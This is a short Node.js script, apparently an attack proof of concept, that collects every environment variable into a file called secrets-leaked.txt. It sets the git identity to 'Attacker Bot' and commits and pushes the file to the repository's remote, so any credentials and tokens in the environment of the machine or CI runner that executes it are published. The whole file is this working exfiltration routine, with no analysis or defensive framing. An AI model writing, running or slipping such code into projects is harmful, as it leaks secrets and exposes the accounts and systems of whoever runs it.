const fs = require('fs');
const { execSync } = require('child_process');

// Step 1: Dump env vars
const envDump = Object.entries(process.env)
  .map(([k, v]) => `${k}=${v}`)
  .join('\n');

// Step 2: Save it inside repo
fs.writeFileSync('secrets-leaked.txt', envDump);

// Step 3: Git config
execSync('git config user.email "attacker@example.com"');
execSync('git config user.name "Attacker Bot"');

// Step 4: Commit and push
try {
  execSync('git add secrets-leaked.txt');
  execSync('git commit -m "leak: secrets leaked"');
  execSync('git push');
  console.log("✅ Secrets committed to repo");
} catch (err) {
  console.error("❌ Error committing secrets:", err.message);
}
